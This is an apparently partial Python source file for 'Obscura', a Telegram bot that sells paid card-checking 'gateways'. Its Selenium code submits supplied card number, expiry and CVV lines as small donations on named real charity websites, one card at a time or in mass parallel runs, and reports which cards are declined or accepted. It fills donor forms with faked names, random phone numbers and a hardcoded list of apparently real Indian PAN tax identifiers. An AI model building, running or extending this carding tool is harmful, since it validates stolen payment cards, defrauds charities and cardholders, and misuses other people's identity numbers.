        "Whether you're on a mission or just need a quick check, we've got your back with top-notch accuracy.\n\n"
        "🙏 Thanks for choosing Obscura. Let’s get things rolling by provisioning my powers using /cmd ! ⚡"
    )

    update.message.reply_text(welcome_message)

def check_subscription_type(user_id):
    try:
        with open('approved_users.json', 'r') as file:
            approved_users = json.load(file)
        return "PREMIUM" if user_id in approved_users else "FREE"
    except Exception as e:
        print(f"Error loading approved_users.json: {e}")
        return "FREE"

# Function to handle the /info command
def info(update: Update, context: CallbackContext) -> None:
    user = update.message.from_user

    # Determine the subscription type
    subscription_type = check_subscription_type(user.id)

    info_text = (
        "╔════════════╗\n"
        "         ℹ️ <b>User Info</b> ℹ️\n"
        "╚════════════╝\n\n"
        f"🆔 <b>ID:</b> <code>{user.id}</code>\n"
        f"👤 <b>Name:</b> {user.full_name}\n"
        f"🔹 <b>Username:</b> @{user.username}\n"
        f"💎 <b>Subscription:</b> {subscription_type}\n\n"
        "╚════════════╝"
    )

    update.message.reply_text(info_text, parse_mode=ParseMode.HTML)

def cmd(update: Update, context: CallbackContext) -> None:
    cmd_text = (
        "🔧 <b>Available Gateways</b> 🔧\n\n"
        "╔═════════════════╗\n\n"
        "║ 🚀 /sh : <b>Shopify</b> 15$ ✅️                ║\n\n"
        "╠═════════════════╣\n\n"
        "║ 💳 /c   : <b>Stripe</b> 10$ ✅️                   ║\n\n"
        "╠═════════════════╣\n\n"
        "║ 💸 /rz : <b>Razorpay</b> 100₹ ✅️           ║\n\n"
        "╠═════════════════╣\n\n"
        "║ 💰 /pp : <b>Paypal</b> 1$ ✅️                   ║\n\n"
        "╠═════════════════╣\n\n"
        "║ 💵 /py : <b>PayU</b> 200₹ ✅️                  ║\n\n"
        "╠═════════════════╣\n\n"
        "║ 🏦 /mchk : <b>Stripe Mass</b> 0.5$ ✅️       ║\n\n"
        "╚═════════════════╝\n"
    )
    update.message.reply_text(cmd_text, parse_mode=ParseMode.HTML)


def sh_command(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in approved_users:
        update.message.reply_text("You are not authorized to use this bot.")
        return

    card_details_string = ' '.join(context.args)
    card_details = convert_cc_details(card_details_string)
    threading.Thread(target=process_shopify_payment, args=(update, context, card_details)).start()# Set up the Telegram bot

def process_line(line):
    parts = line.strip().split('|')
    if len(parts) != 4:
        return None, None, None

    a = parts[0]
    month = parts[1].zfill(2)
    year = parts[2]
    c = parts[3]

    if len(year) == 2:
        b = f"{month}{year}"
    elif len(year) == 4:
        b = f"{month}{year[-2:]}"
    else:
        return None, None, None

    return a, b, c

def cc_num(driver, a, b, c):
    iframe = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.CSS_SELECTOR, 'iframe[name^="__privateStripeFrame"]'))
    )
    driver.switch_to.frame(iframe)
    print(a, b, c)

    # Simulate real user input by sending keys with a slight delay
    card_number = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.NAME, 'cardnumber'))
    )
    card_number.click()
    for char in a:
        card_number.send_keys(char)
        time.sleep(0.1)

    exp_date = driver.find_element(By.NAME, 'exp-date')
    exp_date.click()
    for char in b:
        exp_date.send_keys(char)
        time.sleep(0.1)
    cvc = driver.find_element(By.NAME, 'cvc')
    cvc.click()
    for char in c:
        cvc.send_keys(char)
        time.sleep(0.1)
    time.sleep(7)
    webdriver.ActionChains(driver).send_keys(Keys.ENTER).perform()
    time.sleep(15)
    driver.switch_to.default_content()
    error_message_div = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.XPATH, '//*[@id="ffc_app_instance_1"]/div/div/div[1]/div/div[8]/div[2]/div'))
    )
    error_message = error_message_div.text
    print(f"Error message: {error_message}")
    return error_message

def update_message(context, chat_id, message_id, card_status):
    message_text = ""
    for status in card_status:
        message_text += f"CC: {status['card']}\nIssuer: {status['issuer']}\nCountry: {status['country']}\nProgress: {status['progress_bar']}\nResult: {status['result']}\n\n"
    context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=message_text, parse_mode=ParseMode.MARKDOWN)

def process_card(context, chat_id, message_id, card_status, idx, card_details, total_cards):
    a, b, c = process_line(card_details)
    if not a or not b or not c:
        card_status[idx]['result'] = f"Invalid format for line: {card_details}"
        update_message(context, chat_id, message_id, card_status)
        return

    driver=c_web()
    driver.get("https://lumivoce.org/donate/")

    try:
        card_status[idx]['progress_bar'] = generate_progress_bar(25)
        update_message(context, chat_id, message_id, card_status)

        start_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, '//*[@id="ffc_app_instance_1"]/div/div/div[1]/div/div[1]/div/div/div/div/div[3]/button'))
        )
        start_button.click()
        time.sleep(2)
        webdriver.ActionChains(driver).send_keys('A').perform()
        time.sleep(1)
        webdriver.ActionChains(driver).send_keys('E').perform()
        time.sleep(1)
        webdriver.ActionChains(driver).send_keys('4').perform()
        time.sleep(1)
        webdriver.ActionChains(driver).send_keys(Keys.ENTER).perform()
        time.sleep(1)
        webdriver.ActionChains(driver).send_keys('Gulshan').perform()
        webdriver.ActionChains(driver).send_keys(Keys.ENTER).perform()
        time.sleep(1)
        webdriver.ActionChains(driver).send_keys('dwe.cloud@gmail.com').perform()
        webdriver.ActionChains(driver).send_keys(Keys.ENTER).perform()
        time.sleep(1)
        webdriver.ActionChains(driver).send_keys('A').perform()
        time.sleep(3)
        card_status[idx]['progress_bar'] = generate_progress_bar(70)
        update_message(context, chat_id, message_id, card_status)

        error_message = cc_num(driver, a, b, c)

        # Checking the error message for specific keywords
        if 'decline' in error_message.lower():
            result_message = '❌ Card Declined'
        elif 'incorrect' in error_message.lower():
            result_message = "⚠️Your Card's Cvv is incorrect"
        else:
            result_message = '✅ Thank you for donating'

        card_status[idx]['result'] = result_message
    except Exception as e:
        card_status[idx]['result'] = f"An error occurred for {a}: {e}"
    finally:
        driver.quit()

    card_status[idx]['progress_bar'] = generate_progress_bar(100)
    update_message(context, chat_id, message_id, card_status)

def update_message(context, chat_id, message_id, card_status):
    message_text = "🔐 **Gateway:** Stripe 0.5$ Mass Charge\n\n"
    for status in card_status:
        message_text += (
            f"💳 **CC:** `{status['card']}`\n"
            f"🏦 **Issuer:** `{status['issuer']}`\n"
            f"🌍 **Country:** `{status['country']}`\n"
            f"📊 **Progress:** `{status['progress_bar']}`\n"
            f"📋 **Result:** `{status['result']}`\n"
            f"─────────────────────────────\n\n"
        )
    context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=message_text, parse_mode=ParseMode.MARKDOWN)

def check_credit_card(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    if user_id not in approved_users:
        update.message.reply_text("You are not authorized to use this bot.")
        return
    chat_id = update.message.chat_id
    if context.args:
        input_lines = context.args
    else:
        context.bot.send_message(chat_id=chat_id, text="Please provide the credit card details in the format: 'number|month|year|cvv'")
        return

    total_cards = len(input_lines)
    card_status = []

    for line in input_lines:
        bin_info = fetch_bin_details(line.split('|')[0][:6])
        card_status.append({
            'card': line,
            'issuer': bin_info['Issuer'],
            'country': bin_info['Country'],
            'progress_bar': generate_progress_bar(0),
            'result': '🔄 Checking...'
        })

    initial_message = "🔐 **Gateway:** Stripe 0.5$ Mass Charge\n\n" + "\n".join([
        f"💳 **CC:** `{status['card']}`\n"
        f"🏦 **Issuer:** `{status['issuer']}`\n"
        f"🌍 **Country:** `{status['country']}`\n"
        f"📊 **Progress:** `{status['progress_bar']}`\n"
        f"📋 **Result:** `{status['result']}`\n"
        f"─────────────────────────────\n" for status in card_status
    ])
    message = context.bot.send_message(chat_id=chat_id, text=initial_message, parse_mode=ParseMode.MARKDOWN)
    message_id = message.message_id

    threads = []
    for idx, line in enumerate(input_lines):
        t = threading.Thread(target=process_card, args=(context, chat_id, message_id, card_status, idx, line, total_cards))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

def payu_process_donation(update: Update, context: CallbackContext, card_details):
    fake = Faker()
    chat_id = update.message.chat_id
    driver=c_web()
    driver.get("https://bpaindia.org/donate/")

    random_name = fake.name()
    random_email = fake.email()
    ex1 = card_details['exp'].replace('/', '')
    full_cc_details = f"{card_details['cc_number']}|{ex1[:2]}|{ex1[2:]}|{card_details['cvc']}"
    bin_number = card_details['cc_number'][:6]
    bin_details = fetch_bin_details(bin_number)

    initial_message_template = """
🔐 *Gateway:* PAYU ₹ 200 Charge

🚀 *Progress:* {progress}

🤖 *Bot by:* @Dwoscloud
    """

    final_message_template = f"""
🔐 *Gateway:* PAYU ₹ 200 Charge

💳 *CC:* `{full_cc_details}`

📋 *Issuer:* `{bin_details['Issuer']}`

📊 *Result:* {{result}}

🤖 *Bot by:* @Dwoscloud
    """

    # Send initial message
    progress_message = update.message.reply_text(
        initial_message_template.format(progress=generate_progress_bar(0)), parse_mode=ParseMode.MARKDOWN)
    try:
        progress = 0
        last_progress_text = ""

        # Updating progress function
        def update_progress(step, result="Pending..."):
            nonlocal progress, last_progress_text
            progress += step
            new_progress_text = initial_message_template.format(progress=generate_progress_bar(progress))
            if new_progress_text != last_progress_text:
                progress_message.edit_text(new_progress_text, parse_mode=ParseMode.MARKDOWN)
                last_progress_text = new_progress_text

        update_progress(10)
        time.sleep(1)

        wait = WebDriverWait(driver, 20)
        checkbox = wait.until(EC.presence_of_element_located((By.ID, 'check_id_3667_8188')))
        driver.execute_script("arguments[0].click();", checkbox)
        time.sleep(2)
        donate_button = driver.find_element(By.CSS_SELECTOR, "a.button.add_to_cart_all_selected.add2c_selected.already_counted")
        driver.execute_script("arguments[0].click();", donate_button)
        update_progress(20)
        time.sleep(5)

        first_name_field = wait.until(EC.presence_of_element_located((By.ID, 'billing_first_name')))
        first_name_field.send_keys(random_name.split()[0])
        last_name_field = driver.find_element(By.ID, 'billing_last_name')
        last_name_field.send_keys(random_name.split()[-1])
        add_name_field = driver.find_element(By.ID, 'billing_address_1')
        add_name_field.send_keys("Mumbai")
        lasta_name_field = driver.find_element(By.ID, 'billing_city')
        lasta_name_field.send_keys("Mumbai")
        random_number_pin = random.randint(400000, 500000)
        lastp_name_field = driver.find_element(By.ID, 'billing_postcode')
        lastp_name_field.send_keys(random_number_pin)
        random_number = random.randint(1000000, 9999999)
        # Prefix with "778" to make it a 10-digit number
        final_number = f"778{random_number}"
        ph_field = driver.find_element(By.ID, 'billing_phone')
        ph_field.send_keys(final_number)
        pan_card_numbers = [
            "aucpm7625d",
            "AHIPN2859B",
            "AKJPR2464C",
            "AHOPB7077B",
            "BDAPK4323C",
            "BEMPS1216P",
            "BIVPS1015D",
            "ACHPY6540L",
            "AMMPG5766B",
            "BBJPK8460M",
            "ADTPB9760D",
            "APGPS2215A",
            "ANUPP6950B",
            "ANIPP6744K",
            "ABHPH9288D",
            "AFAPN4905L",
            "AEXPG7779P",
            "ADRPC8523E",
            "ayyps1918d",
            "ADSPN2895D",
            "ARTPM5105G",
            "BEFPS3809K",
            "AQMPM7583Q",
            "AHWPJ4675D",
            "ASKPP4968N",
            "AJAPA3595M",
            "AADPT5437B",
            "AXIPS2232D",
            "BILPS1618G",
            "AJUPD2997E",
            "AICPP4634P",
            "acvph6140f",
            "ASLPP7670E",
            "AJQPB0756R",
            "BQMPS1051G",
            "AEKPT6554Q",
            "ASJPK8982A",
            "ANNPK0053D",
            "BGOPS4515F",
            "AFEPT7522F",
            "ASZPK9509M",
            "amnps7211e",
            "APWPP8010L",
            "ABXPY2655D",
            "agspr4091g",
            "bxsps1128p",
            "AKPPA3893A",
            "AAIPD7502Q",
            "BINPS8581C",
            "ADDPL9585D",
            "AIHPK0758L",
            "ADWPT8130F",
            "amapd8610k",
            "bxcps7726k",
            "AMBPM0239J",
            "AGIPN9009L",
            "AIEPA3401F",
            "AGBPN2557L",
            "BFVPS3530L",
            "ANIPP3575G",
            "AKQPR4950E",
            "AZOPS2238P",
            "AMBPD0964H"
        ]
        pan_field = driver.find_element(By.ID, 'pan_number')
        pan_field.send_keys(random.choice(pan_card_numbers))
        em_field = driver.find_element(By.ID, 'billing_email')
        em_field.send_keys(random_email)
        update_progress(30)
        time.sleep(1)

        checkout_button = driver.find_element(By.ID, 'place_order')
        checkout_button.click()
        update_progress(10)
        time.sleep(3)

        iframe = wait.until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "iframe[id^='boltFrame']"))
        )
        driver.switch_to.frame(iframe)

        credit_debit_container = wait.until(
            EC.presence_of_element_located((By.XPATH, "//*[@id='payment-options']/ul/section/li[2]"))
        )
        driver.execute_script("arguments[0].scrollIntoView(true);", credit_debit_container)
        credit_debit_text = credit_debit_container.find_element(By.XPATH, ".//span[2]")
        time.sleep(3)

        driver.execute_script("arguments[0].click();", credit_debit_text)
        update_progress(10)
        time.sleep(1)

        card_number_input = wait.until(
            EC.presence_of_element_located((By.ID, "cardNumber"))
        )
        card_number_input.send_keys(card_details['cc_number'])
        expiry_input = driver.find_element(By.ID, "cardExpiry")
        expiry_input.send_keys(ex1)
        cvv_input = driver.find_element(By.ID, "cardCvv")
        cvv_input.send_keys(card_details['cvc'])
        name_input = driver.find_element(By.ID, "cardOwnerName")
        name_input.send_keys(random_name)
        update_progress(10)
        time.sleep(3)

        proceed_button = driver.find_element(By.XPATH, "//*[@id='ccdcCardsForm']/button/div")
        driver.execute_script("arguments[0].click();", proceed_button)

        update_progress(10)
        new_window_opened = False
        start_time = time.time()
        while time.time() - start_time < 10:
            if len(driver.window_handles) > 1:
                new_window_opened = True
                break
            time.sleep(0.5)

        driver.switch_to.default_content()
        driver.switch_to.frame(iframe)

        try:
            error_message = wait.until(
                EC.presence_of_element_located(
                    (By.XPATH, "//*[contains(text(), 'order can’t be processed') or contains(text(), 'failed') or contains(text(), 'Payment could not be processed, Try again')]"))
            )
            result_message = f"📋 **Result:** Card Declined"
        except:
            result_message = "📋 **Result:** Thank you for donating"

        try:
            success_message = wait.until(
                EC.presence_of_element_located(
                    (By.XPATH, "//*[contains(text(), 'Payment successful') or contains(text(), 'Thank you for your donation')]"))
            )
            result_message = f"📋 **Result:** {success_message.text}"
        except:
            pass

        progress_message.edit_text(final_message_template.format(result=result_message), parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        context.bot.send_message(chat_id=chat_id, text=f"Exception occurred: {e}")
    finally:
        driver.quit()

def payu_donate_command(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in approved_users:
        update.message.reply_text("You are not authorized to use this bot.")
        return

    card_details_string = ' '.join(context.args)
    card_details = convert_cc_details(card_details_string)
    if card_details is None:
        context.bot.send_message(chat_id=update.message.chat_id,
                                 text="Please provide card details in the format: card_number|expiry_month|expiry_year|cvv")
        return

    threading.Thread(target=payu_process_donation, args=(update, context, card_details)).start()
def main():
    updater = Updater('BOT TOKEN', use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("c", cc_command))
    dp.add_handler(CommandHandler("approve", approve_command))
    dp.add_handler(CommandHandler("revoke", revoke_command))
    dp.add_handler(CommandHandler("pp", pp_command))  # Add the /pp command handler
    dp.add_handler(CommandHandler("rz", donatekart_command))
    dp.add_handler(CommandHandler("mchk", check_credit_card, pass_args=True))
    dp.add_handler(CommandHandler("sh", sh_command))
    dp.add_handler(CommandHandler("py", payu_donate_command))
    dp.add_handler(CommandHandler("info",info))
    dp.add_handler(CommandHandler("cmd", cmd))
    dp.add_handler(CommandHandler("start",start))

    ping_thread = threading.Thread(target=send_ping)
    ping_thread.daemon = True  # Ensure it exits when the main program exits
    ping_thread.start()
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
